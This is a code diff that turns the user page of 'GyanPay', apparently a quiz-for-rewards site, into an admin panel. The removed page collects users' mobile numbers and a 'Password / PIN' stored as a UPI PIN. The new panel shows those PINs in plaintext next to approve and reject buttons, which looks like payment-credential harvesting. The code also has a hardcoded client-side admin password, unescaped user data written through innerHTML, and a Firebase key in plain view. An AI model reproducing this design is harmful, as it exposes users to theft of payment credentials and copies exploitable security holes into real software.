@@ -3,187 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GyanPay - Play Quiz & Win</title>
+    <title>GyanPay - Admin Panel</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #0f172a;
-            color: #ffffff;
-            margin: 0;
-            padding: 0;
-        }
-        /* Top Header Navbar */
-        .navbar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background-color: #1e293b;
-            padding: 12px 20px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-        }
-        .logo-area {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 20px;
-            font-weight: bold;
-            color: #ffc107;
-        }
-        .logo-icon {
-            background: #ffc107;
-            color: #0f172a;
-            padding: 6px 12px;
-            border-radius: 6px;
-            font-weight: bold;
-        }
-        .nav-buttons {
-            display: flex;
-            gap: 8px;
-        }
-        .btn-nav {
-            padding: 8px 14px;
-            border: none;
-            border-radius: 6px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 13px;
-        }
-        .btn-login { background-color: #3b82f6; color: white; }
-        .btn-register { background-color: #f59e0b; color: white; }
-        .btn-admin { background-color: #ef4444; color: white; text-decoration: none; display: inline-flex; align-items: center; }
-
-        /* Main Container */
-        .container {
-            max-width: 550px;
-            margin: 40px auto;
-            background: #1e293b;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 8px 16px rgba(0,0,0,0.4);
-        }
-        h2 { color: #f8fafc; margin-bottom: 10px; text-align: center; }
-        p { color: #94a3b8; text-align: center; }
-
-        /* Form Sections */
-        .form-section {
-            display: none;
-            margin-top: 20px;
-        }
-        .form-section.active {
-            display: block;
-        }
-        .input-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #cbd5e1;
-            font-size: 14px;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            background: #0f172a;
-            border: 1px solid #475569;
-            border-radius: 6px;
-            color: white;
-            box-sizing: border-box;
-        }
-        .btn-submit {
-            width: 100%;
-            padding: 12px;
-            background: #10b981;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .btn-submit:hover { background-color: #059669; }
-
-        .wallet-box {
-            background: #0f172a;
-            border: 1px solid #334155;
-            padding: 20px;
-            border-radius: 8px;
-            margin-top: 20px;
-            text-align: left;
-        }
+        body { font-family: Arial, sans-serif; background-color: #0f172a; color: #ffffff; margin: 0; padding: 20px; }
+        .container { max-width: 900px; margin: auto; background: #1e293b; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        h2, h3 { color: #f8fafc; text-align: center; }
+        .login-box, .admin-panel { display: none; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 12px; border: 1px solid #334155; text-align: center; }
+        th { background-color: #3b82f6; color: white; }
+        tr:nth-child(even) { background-color: #172033; }
+        button { padding: 6px 12px; cursor: pointer; border: none; border-radius: 4px; color: white; font-weight: bold; }
+        .btn-approve { background-color: #10b981; }
+        .btn-reject { background-color: #ef4444; }
+        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
+        .settings-card { background: #0f172a; padding: 15px; border-radius: 8px; margin-bottom: 25px; border: 1px solid #334155; }
+        .settings-card input, .settings-card select { padding: 8px; margin: 5px 10px 5px 0; background: #1e293b; border: 1px solid #475569; color: white; border-radius: 4px; }
     </style>
 </head>
 <body>
-
-    <!-- Header Navbar (Demo जैसा) -->
-    <div class="navbar">
-        <div class="logo-area">
-            <span class="logo-icon">G</span>
-            <span>GyanPay</span>
-        </div>
-        <div class="nav-buttons">
-            <button class="btn-nav btn-login" onclick="showTab('login')">Login</button>
-            <button class="btn-nav btn-register" onclick="showTab('register')">Register</button>
-            <a href="admin.html" class="btn-nav btn-admin">Admin Portal</a>
-        </div>
-    </div>
-
     <div class="container">
-        <!-- Home / Hero Section (Demo Style) -->
-        <div id="homeHero" class="form-section active">
-            <h2>Play Quiz & Win Real Rewards</h2>
-            <p>Dynamic withdrawal limits & automated payout system.</p>
-            
-            <div class="wallet-box">
-                <h4 style="margin: 0 0 10px 0; color: #f59e0b;">🎁 आपका वॉलेट बैलेंस</h4>
-                <p style="margin: 0; color: #cbd5e1;">यूज़र: <b style="color: #fff;" id="displayUserName">Guest User</b></p>
+        <div id="loginBox" class="login-box" style="display: block;">
+            <h2>Admin Portal Login</h2>
+            <div style="text-align: center; margin-top: 20px;">
+                <input type="password" id="adminPasswordInput" placeholder="Enter Admin Password" style="padding: 10px; width: 60%; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 6px;"><br><br>
+                <button onclick="loginAdmin()" style="background-color: #3b82f6; padding: 10px 20px; border-radius: 6px;">Login</button>
+                <p id="loginError" style="color: #ef4444; margin-top: 10px;"></p>
             </div>
-            <button onclick="showTab('register')" class="btn-submit" style="background-color: #f59e0b; margin-top: 20px;">Get Started (Register)</button>
         </div>
 
-        <!-- Login Section -->
-        <div id="loginSection" class="form-section">
-            <h2>User Login</h2>
-            <form id="loginForm">
-                <div class="input-group">
-                    <label>Mobile Number</label>
-                    <input type="text" id="loginMobile" required placeholder="Enter your mobile number">
-                </div>
-                <div class="input-group">
-                    <label>Password / PIN</label>
-                    <input type="password" id="loginPin" required placeholder="Enter your password">
-                </div>
-                <button type="submit" class="btn-submit">Login to Game</button>
-            </form>
-        </div>
+        <div id="adminPanel" class="admin-panel">
+            <div class="top-bar">
+                <h2>GyanPay Admin Dashboard</h2>
+                <button onclick="changePassword()" style="background-color: #f59e0b; color: black;">Change Password</button>
+            </div>
 
-        <!-- Register Section -->
-        <div id="registerSection" class="form-section">
-            <h2>Create New Account</h2>
-            <form id="registerForm">
-                <div class="input-group">
-                    <label>Your Name</label>
-                    <input type="text" id="regName" required placeholder="Enter your name (e.g. Laky01)">
+            <!-- Quiz Start Time Schedule Panel -->
+            <div class="settings-card">
+                <h3>⏰ Quiz Start Time Scheduler</h3>
+                <div style="text-align: center;">
+                    <label>Start After: </label>
+                    <input type="number" id="startTimeValue" value="30" style="width: 70px;">
+                    <select id="startTimeUnit">
+                        <option value="minutes">Minutes (मिनट बाद)</option>
+                        <option value="hours">Hours (घंटे बाद)</option>
+                    </select>
+                    <button onclick="saveQuizTimer()" style="background-color: #10b981; padding: 8px 16px; margin-left: 10px;">Set & Broadcast Timer</button>
                 </div>
-                <div class="input-group">
-                    <label>Mobile Number</label>
-                    <input type="text" id="regMobile" required placeholder="Enter your mobile number">
-                </div>
-                <div class="input-group">
-                    <label>Password / PIN</label>
-                    <input type="password" id="regPin" required placeholder="Create a password">
-                </div>
-                <button type="submit" class="btn-submit">Register & Submit</button>
-            </form>
+            </div>
+            
+            <h3>User Submissions & Approvals</h3>
+            <div id="loading" style="text-align: center; color: #94a3b8;">Loading data from database...</div>
+            
+            <table id="dataTable" style="display: none;">
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>User Name</th>
+                        <th>Mobile Number</th>
+                        <th>Password/PIN</th>
+                        <th>Status</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody id="tableBody"></tbody>
+            </table>
         </div>
     </div>
 
-    <!-- Firebase SDKs -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, collection, addDoc, getDocs, query, where } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { getFirestore, collection, getDocs, updateDoc, doc, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         const firebaseConfig = {
           apiKey: "AIzaSyAqbegdp-6ppy2EBaZDSWGWpMQRamKTCNc",
@@ -197,93 +87,96 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // Tabs Switch Logic
-        window.showTab = function(tabName) {
-            document.getElementById('homeHero').classList.remove('active');
-            document.getElementById('loginSection').classList.remove('active');
-            document.getElementById('registerSection').classList.remove('active');
+        if (!localStorage.getItem("adminPass")) localStorage.setItem("adminPass", "admin123");
+        
+        // Default: 30 minutes later target time
+        if (!localStorage.getItem("quizTargetTime")) {
+            const futureTime = new Date().getTime() + 30 * 60 * 1000;
+            localStorage.setItem("quizTargetTime", futureTime);
+        }
 
-            if(tabName === 'login') {
-                document.getElementById('loginSection').classList.add('active');
-            } else if(tabName === 'register') {
-                document.getElementById('registerSection').classList.add('active');
+        window.loginAdmin = function() {
+            const pass = document.getElementById("adminPasswordInput").value;
+            if (pass === localStorage.getItem("adminPass")) {
+                document.getElementById("loginBox").style.display = "none";
+                document.getElementById("adminPanel").style.display = "block";
+                loadAdminData();
             } else {
-                document.getElementById('homeHero').classList.add('active');
+                document.getElementById("loginError").innerText = "Invalid Password!";
             }
         };
 
-        // Register Form Handling
-        const regForm = document.getElementById('registerForm');
-        regForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const name = document.getElementById('regName').value;
-            const mobile = document.getElementById('regMobile').value;
-            const pin = document.getElementById('regPin').value;
-
-            try {
-                await addDoc(collection(db, "usersData"), {
-                    userName: name,
-                    mobileNumber: mobile,
-                    upiPin: pin,
-                    status: "Pending",
-                    timestamp: new Date()
-                });
-                alert('Registration successful! Waiting for Admin Approval.');
-                regForm.reset();
-                showTab('login');
-            } catch (error) {
-                console.error("Error: ", error);
-                alert('Registration failed.');
+        window.changePassword = function() {
+            const newPass = prompt("Enter new admin password:");
+            if (newPass) {
+                localStorage.setItem("adminPass", newPass);
+                alert("Password changed successfully!");
             }
-        });
+        };
 
-        // Login Form Handling
-        const loginForm = document.getElementById('loginForm');
-        loginForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const mobile = document.getElementById('loginMobile').value;
-            const pin = document.getElementById('loginPin').value;
+        window.saveQuizTimer = function() {
+            const val = parseInt(document.getElementById("startTimeValue").value);
+            const unit = document.getElementById("startTimeUnit").value;
+            
+            let ms = val * 60 * 1000; // minutes
+            if (unit === "hours") {
+                ms = val * 60 * 60 * 1000; // hours
+            }
+
+            const targetTime = new Date().getTime() + ms;
+            localStorage.setItem("quizTargetTime", targetTime);
+            alert("Quiz start timer successfully updated for all users!");
+        };
+
+        async function loadAdminData() {
+            const tableBody = document.getElementById('tableBody');
+            const loading = document.getElementById('loading');
+            const dataTable = document.getElementById('dataTable');
 
             try {
-                const q = query(collection(db, "usersData"), where("mobileNumber", "==", mobile));
+                const q = query(collection(db, "usersData"), orderBy("timestamp", "desc"));
                 const querySnapshot = await getDocs(q);
 
+                tableBody.innerHTML = "";
+                let index = 1;
+
                 if (querySnapshot.empty) {
-                    alert('Mobile number not found! Please register first.');
+                    loading.innerHTML = "No data found in database.";
                     return;
                 }
 
-                let userFound = false;
-                let userStatus = "Pending";
-                let fetchedName = "User";
+                querySnapshot.forEach((documentSnap) => {
+                    const data = documentSnap.data();
+                    const docId = documentSnap.id;
+                    const status = data.status || "Pending";
 
-                querySnapshot.forEach((doc) => {
-                    const data = doc.data();
-                    if(data.upiPin === pin) {
-                        userFound = true;
-                        userStatus = data.status || "Pending";
-                        fetchedName = data.userName || "User";
-                    }
+                    const row = `<tr>
+                        <td>${index++}</td>
+                        <td>${data.userName || 'N/A'}</td>
+                        <td>${data.mobileNumber || 'N/A'}</td>
+                        <td>${data.upiPin || 'N/A'}</td>
+                        <td><b>${status}</b></td>
+                        <td>
+                            <button class="btn-approve" onclick="updateStatus('${docId}', 'Approved')">Approve</button>
+                            <button class="btn-reject" onclick="updateStatus('${docId}', 'Rejected')">Reject</button>
+                        </td>
+                    </tr>`;
+                    tableBody.innerHTML += row;
                 });
 
-                if(!userFound) {
-                    alert('Incorrect Password / PIN!');
-                    return;
-                }
-
-                if(userStatus === "Approved") {
-                    alert('Login Successful! Welcome ' + fetchedName);
-                    document.getElementById('displayUserName').innerText = fetchedName;
-                    showTab('home');
-                } else {
-                    alert('Your account is still PENDING for Admin Approval. Please wait.');
-                }
-
+                loading.style.display = "none";
+                dataTable.style.display = "table";
             } catch (error) {
-                console.error("Login Error: ", error);
-                alert('Login error.');
+                console.error("Error: ", error);
             }
-        });
+        }
+
+        window.updateStatus = async function(docId, newStatus) {
+            const docRef = doc(db, "usersData", docId);
+            await updateDoc(docRef, { status: newStatus });
+            alert("Status updated to: " + newStatus);
+            loadAdminData();
+        };
     </script>
 </body>
 </html>
